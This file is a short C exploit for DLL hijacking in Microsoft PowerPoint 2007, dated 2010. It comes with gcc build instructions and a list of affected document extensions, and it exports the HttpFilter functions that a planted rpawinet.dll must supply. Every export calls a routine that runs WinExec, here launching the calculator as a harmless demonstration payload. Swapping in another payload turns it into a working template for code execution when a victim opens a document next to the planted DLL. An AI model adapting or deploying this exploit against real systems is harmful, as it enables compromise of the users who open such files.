/*

Exploit Title: Microsoft Office PowerPoint 2007 DLL Hijacking Exploit (rpawinet.dll)
Date: August 25, 2010
Author: storm (storm@gonullyourself.org)
Version: 2007 (12.0.6535.5002) SP2
Tested on: Windows Vista SP2

http://www.gonullyourself.org/

gcc -shared -o rpawinet.dll PowerPoint-DLL.c

.odp, .pothtml, .potm, .potx, .ppa, .ppam, .pps, .ppt, .ppthtml, .pptm, .pptxml, .pwz, .sldm, .sldx, and .thmx files are affected.

*/

#include <windows.h>
#define DllExport __declspec (dllexport)

DllExport void HttpFilterBeginningTransaction() { hax(); }
DllExport void HttpFilterClose() { hax(); }
DllExport void HttpFilterOnBlockingOps() { hax(); }
DllExport void HttpFilterOnResponse() { hax(); }
DllExport void HttpFilterOnTransactionComplete() { hax(); }
DllExport void HttpFilterOpen() { hax(); }

int hax()
{
  WinExec("calc", 0);
  exit(0);
  return 0;
}